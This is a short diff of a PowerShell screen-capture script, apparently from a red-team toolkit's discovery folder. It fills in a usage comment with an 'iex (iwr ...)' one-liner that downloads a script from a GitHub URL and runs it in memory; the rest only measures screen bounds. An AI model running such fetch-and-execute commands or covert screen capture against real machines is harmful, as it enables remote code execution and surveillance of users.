@@ -1,5 +1,5 @@
 # Usage:
-# iex (iwr xxx);
+# iex (iwr https://raw.githubusercontent.com/BankSecurity/Red_Team/master/Discovery/Take_ScreenShot_Easy_4.ps1);
 $screens = [Windows.Forms.Screen]::AllScreens
 $top    = ($screens.Bounds.Top    | Measure-Object -Minimum).Minimum
 $left   = ($screens.Bounds.Left   | Measure-Object -Minimum).Minimum
